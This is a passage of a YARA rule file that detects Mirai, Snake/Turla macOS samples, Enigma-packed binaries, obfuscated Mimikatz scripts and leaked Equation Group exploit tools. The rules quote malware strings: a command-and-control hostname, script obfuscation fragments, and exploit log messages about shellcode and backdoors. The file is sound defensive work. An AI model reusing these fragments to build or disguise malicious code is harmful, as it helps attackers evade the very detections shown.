      description = "Detects Mirai Malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-05-12 09:09:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" fullword ascii
      $s2 = "GET /g.php HTTP/1.1" fullword ascii
      $s3 = "https://%[^/]/%s" fullword ascii
      $s4 = "pass\" value=\"[^\"]*\"" fullword ascii
      $s5 = "jbeupq84v7.2y.net" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 5000KB and 2 of them )
} 

rule SnakeTurla_Malware_May17_1_RID30B1 : DEMO FILE MAL T1136 {
   meta:
      description = "Detects Snake / Turla Sample"
      author = "Florian Roth"
      reference = "https://goo.gl/QaOh4V"
      date = "2017-05-04 12:50:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "/Users/vlad/Desktop/install/install/" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0xfacf and filesize < 200KB and all of them )
} 

rule SnakeTurla_Malware_May17_3_RID30B3 : DEMO FILE MAL T1136 {
   meta:
      description = "Detects Snake / Turla Sample"
      author = "Florian Roth"
      reference = "https://goo.gl/QaOh4V"
      date = "2017-05-04 12:51:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Addy Symonds1" ascii
      $x2 = "com.addy.InstallAdobeFlash" ascii
   condition: 
      ( uint16 ( 0 ) == 0xfacf and filesize < 3000KB and all of them )
} 

rule SnakeTurla_Malware_May17_4_RID30B4 : DEMO FILE MAL T1136 {
   meta:
      description = "Detects Snake / Turla Sample"
      author = "Florian Roth"
      reference = "https://goo.gl/QaOh4V"
      date = "2017-05-04 12:51:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Install Adobe Flash Player.app/com.adobe.updatePK" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x4b50 and filesize < 5000KB and all of them )
} 

rule SnakeTurla_Installd_SH_RID2F9F : DEMO FILE MAL T1136 {
   meta:
      description = "Detects Snake / Turla Sample"
      author = "Florian Roth"
      reference = "https://goo.gl/QaOh4V"
      date = "2017-05-04 12:05:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "PIDS=`ps cax | grep installdp" ascii
      $s2 = "${SCRIPT_DIR}/installdp ${FILE}" ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 20KB and all of them )
} 

rule SnakeTurla_Install_SH_RID2F3B : DEMO FILE MAL T1136 {
   meta:
      description = "Detects Snake / Turla Sample"
      author = "Florian Roth"
      reference = "https://goo.gl/QaOh4V"
      date = "2017-05-04 11:48:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "${TARGET_PATH}/installd.sh" ascii
      $s2 = "$TARGET_PATH2/com.adobe.update.plist" ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 20KB and all of them )
} 

rule SnakeTurla_Malware_May17_2_RID30B2 : DEMO FILE MAL T1136 {
   meta:
      description = "Detects Snake / Turla Sample"
      author = "Florian Roth"
      reference = "https://goo.gl/QaOh4V"
      date = "2017-05-04 12:50:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "b_openssl: oops - number of mutexes is 0" fullword ascii
      $s2 = "networksetup -get%sproxy Ethernet" fullword ascii
      $s3 = "012A04DECBC441e49C527B2798F54CA7LOG_NAMED_PIPE_NAME" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0xfacf and filesize < 6000KB and all of them )
} 

rule Enigma_Protected_Malware_May17_RhxFiles_RID3605 : DEMO EXE FILE MAL {
   meta:
      description = "Detects Enigma protected malware samples"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-05-02 16:38:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "1.7"
      
   strings:
      $op1 = { bd 9c 74 f6 7a 3a f7 94 c5 7d 7c 7c 7c 7e ae 73 } 
      $op2 = { 82 62 6b 6b 6b 68 a5 ea aa 69 6b 6b 6b 3a 3b 94 } 
      $op3 = { 7c 7c c5 7d 7c 7c 7c 7e ae 73 f9 79 7c 7c 7c f6 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and all of them )
} 

rule EnigmaPacker_Rare_RID2DA1 : DEMO EXE FILE MAL T1045 T1136 {
   meta:
      description = "Detects an ENIGMA packed executable"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-04-27 10:40:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1045, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "P.rel$oc$" fullword ascii
      $s2 = "ENIGMA" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and all of them )
} 

rule Obfuscated_VBS_April17_RID2F1A : DEMO HKTL S0002 SCRIPT T1003 T1027 T1075 T1097 T1136 T1178 {
   meta:
      description = "Detects cloaked Mimikatz in VBS obfuscation"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-04-21 11:42:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, S0002, SCRIPT, T1003, T1027, T1075, T1097, T1136, T1178"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "::::::ExecuteGlobal unescape(unescape(" ascii
   condition: 
      filesize < 500KB and all of them
} 

rule Obfuscated_JS_April17_RID2ECC : DEMO HKTL S0002 T1003 T1027 T1075 T1097 T1136 T1178 {
   meta:
      description = "Detects cloaked Mimikatz in JS obfuscation"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-04-21 11:29:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, S0002, T1003, T1027, T1075, T1097, T1136, T1178"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\";function Main(){for(var " ascii
      $s2 = "=String.fromCharCode(parseInt(" ascii
      $s3 = "));(new Function(" ascii
   condition: 
      filesize < 500KB and all of them
} 

rule EquationGroup_scanner_output_RID32BD : APT DEMO T1136 {
   meta:
      description = "Detects output generated by EQGRP scanner.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-04-17 14:18:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "# scanning ip  " ascii
      $s1 = "# Scan for windows boxes" ascii fullword
      $s2 = "Going into send" ascii fullword
      $s3 = "# Does not work" ascii fullword
      $s4 = "You are the weakest link, goodbye" ascii fullword
      $s5 = "rpc   Scan for RPC  folks" ascii fullword
   condition: 
      filesize < 1000KB and 2 of them
} 

rule EquationGroup_Toolset_Apr17_Eclipsedwing_Rpcproxy_Pcdlllauncher_RID403A : APT DEMO EXE FILE T1086 T1090 T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 23:53:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1086, T1090, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "[-] Failed to Prepare Payload!" fullword ascii
      $x2 = "ShellcodeStartOffset" fullword ascii
      $x3 = "[*] Waiting for AuthCode from exploit" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_Explodingcantouch_1_2_1_RID3AA6 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 19:55:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "[-] Connection closed by remote host (TCP Ack/Fin)" fullword ascii
      $s2 = "[!]Warning: Error on first request - path size may actually be larger than indicated." fullword ascii
      $s4 = "<http://%s/%s> (Not <locktoken:write1>) <http://%s/>" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_Architouch_1_0_0_RID37AE : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:48:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "[+] Target is %s" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_Erraticgopher_1_0_1_RID38F4 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:43:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "[-] Error appending shellcode buffer" fullword ascii
      $x2 = "[-] Shellcode is too big" fullword ascii
      $x3 = "[+] Exploit Payload Sent!" fullword ascii
      $x4 = "[+] Bound to Dimsvc, sending exploit request to opnum 29" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_Esteemaudit_2_1_0_RID3820 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:07:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "[+] Connected to target %s:%d" fullword ascii
      $x2 = "[-] build_exploit_run_x64():" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_Darkpulsar_1_1_0_RID37BE : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:51:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "[%s] - Error upgraded DLL architecture does not match target architecture (0x%x)" fullword ascii
      $x2 = "[%s] - Error building DLL loading shellcode" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_Educatedscholar_1_0_0_RID39AF : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 19:14:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "[+] Shellcode Callback %s:%d" fullword ascii
      $x2 = "[+] Exploiting Target" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_Doublepulsar_1_3_1_RID389A : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:28:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "[+] Ping returned Target architecture: %s - XOR Key: 0x%08X" fullword ascii
      $x2 = "[.] Sending shellcode to inject DLL" fullword ascii
      $x3 = "[-] Error setting ShellcodeFile name" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_Erraticgophertouch_1_0_1_RID3B17 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 20:14:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "[-] Unable to connect to broswer named pipe, target is NOT vulnerable" fullword ascii
      $x2 = "[-] Unable to bind to Dimsvc RPC syntax, target is NOT vulnerable" fullword ascii
      $x3 = "[+] Bound to Dimsvc, target IS vulnerable" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 30KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_Smbtouch_1_1_1_RID36EB : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:16:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "[+] Target is vulnerable to %d exploit%s" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_Educatedscholartouch_1_0_0_RID3BD2 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 20:45:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "[!] A vulnerable target will not respond." fullword ascii
      $x2 = "[-] Target NOT Vulernable" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 30KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_Esteemaudittouch_2_1_0_RID3A43 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 19:39:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "[-] Touching the target failed!" fullword ascii
      $x2 = "[-] OS fingerprint not complete - 0x%08x!" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_Rpctouch_2_1_0_RID36EE : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:16:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "[*] Failed to detect OS / Service Pack on %s:%d" fullword ascii
      $x2 = "[*] SMB String: %s (%s)" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_Mofconfig_1_0_0_RID373C : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:29:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "[-] Get RemoteMOFTriggerPath error" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 50KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_Easypi_Explodingcan_RID399C : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 19:11:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "[-] %s - Target might not be in a usable state." fullword ascii
      $x2 = "[*] Exploiting Target" fullword ascii
      $x3 = "[-] Encoding Exploit Payload failed!" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_Eclipsedwingtouch_1_0_4_RID3AA9 : APT DEMO EXE FILE T1086 T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 19:56:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "[-] The target is NOT vulnerable" fullword ascii
      $x2 = "[+] The target IS VULNERABLE" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 50KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_Iistouch_1_2_2_RID36F0 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:17:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "[-] Are you being redirectect? Need to retarget?" fullword ascii
      $x2 = "[+] IIS Target OS: %s" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 60KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_Namedpipetouch_2_0_0_RID395B : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 19:00:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "[*] Summary: %d pipes found" fullword ascii
      $s3 = "[+] Testing %d pipes" fullword ascii
      $s6 = "[-] Error on SMB startup, aborting" fullword ascii
      $s12 = "92a761c29b946aa458876ff78375e0e28bc8acb0" fullword ascii
      $op1 = { 68 10 10 40 00 56 e8 e1 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 40KB and 2 of them )
} 

rule EquationGroup_Toolset_Apr17_Easybee_1_0_1_RID3663 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:53:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "@@for /f \"delims=\" %%i in ('findstr /smc:\"%s\" *.msg') do if not \"%%MsgFile1%%\"==\"%%i\" del /f \"%%i\"" fullword ascii
      $x2 = "Logging out of WebAdmin (as target account)" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_Regread_1_1_1_RID3660 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:53:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "[+] Connected to the Registry Service" fullword ascii
      $s2 = "f08d49ac41d1023d9d462d58af51414daff95a6a" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_Englishmansdentist_1_2_0_RID3B1A : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 20:14:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "[+] CheckCredentials(): Checking to see if valid username/password" fullword ascii
      $x2 = "Error connecting to target, TbMakeSocket() %s:%d." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_Architouch_Eternalsynergy_Smbtouch_RID3FDF : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 23:38:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "NtErrorMoreProcessingRequired" fullword ascii
      $s2 = "Command Format Error: Error=%x" fullword ascii
      $s3 = "NtErrorPasswordRestriction" fullword ascii
      $op0 = { 8a 85 58 ff ff ff 88 43 4d } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 2 of them )
} 

rule EquationGroup_Toolset_Apr17_Eternalromance_2_RID3837 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:11:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "[+] Backdoor shellcode written" fullword ascii
      $x2 = "[*] Attempting exploit method %d" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17__Emphasismine_RID3738 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:29:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Error: Could not calloc() for shellcode buffer" fullword ascii
      $x2 = "shellcodeSize: 0x%04X + 0x%04X + 0x%04X = 0x%04X" fullword ascii
      $x3 = "Generating shellcode" fullword ascii
      $x4 = "([0-9a-zA-Z]+) OK LOGOUT completed" fullword ascii
      $x5 = "Error: Domino is not the expected version. (%s, %s)" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_Eternalromance_RID37A6 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:47:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "[-] Error: Exploit choice not supported for target OS!!" fullword ascii
      $x2 = "Error: Target machine out of NPP memory (VERY BAD!!) - Backdoor removed" fullword ascii
      $x3 = "[-] Error: Backdoor not present on target" fullword ascii
      $x4 = "***********    TARGET ARCHITECTURE IS X64    ************" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them ) or 2 of them
} 

rule EquationGroup_Toolset_Apr17_Gen4_RID3344 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 14:40:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "[+] \"TargetPort\"      %hu" fullword ascii
      $x2 = "---<<<  Complete  >>>---" fullword ascii
      $x3 = "[+] \"NetworkTimeout\"  %hu" fullword ascii
      $op1 = { 46 83 c4 0c 83 fe 0c 0f 8c 5e ff ff ff b8 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 150KB and ( 1 of ( $x* ) or 2 of them ) )
} 

rule EquationGroup_Toolset_Apr17_Gen1_RID3341 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 14:40:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Restart with the new protocol, address, and port as target." fullword ascii
      $x2 = "TargetPort      : %s (%u)" fullword ascii
      $x3 = "Error: strchr() could not find '@' in account name." fullword ascii
      $x4 = "TargetAcctPwd   : %s" fullword ascii
      $x5 = "Creating CURL connection handle..." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_Gen2_RID3342 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 14:40:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "[+] Setting password : (NULL)" fullword ascii
      $s2 = "[-] TbBuffCpy() failed!" fullword ascii
